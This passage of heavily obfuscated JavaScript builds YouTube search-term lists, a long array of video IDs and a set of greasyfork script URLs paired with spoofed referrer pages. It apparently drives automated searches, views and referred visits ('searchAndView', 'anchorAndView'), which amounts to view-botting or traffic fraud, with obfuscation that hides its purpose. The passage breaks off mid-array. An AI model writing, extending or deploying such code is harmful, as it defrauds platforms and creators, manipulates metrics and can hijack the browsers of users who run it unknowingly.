searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + V(0x4) + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')[W(0x7, '8#vZ')](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x547 + -0x4 * 0x70 + 0x37d * -0x1)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x3bd + 0x1 * 0x22d7 + -0x1 * 0x268a)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x1846 * -0x1 + 0x2490 + 0x3cd3 * -0x1);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    V(0xf) + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    V(0x18) + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    X(0x1a) + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    W(0x20, 'Dfbq') + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    W(0x1f, '6mwG') + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    X(0xa) + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + W(0x9, 'KPG1') + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + X(0x0) + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + W(0x1d, 'N2]!') + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + W(0x6, '0Unr') + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': V(0x15) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
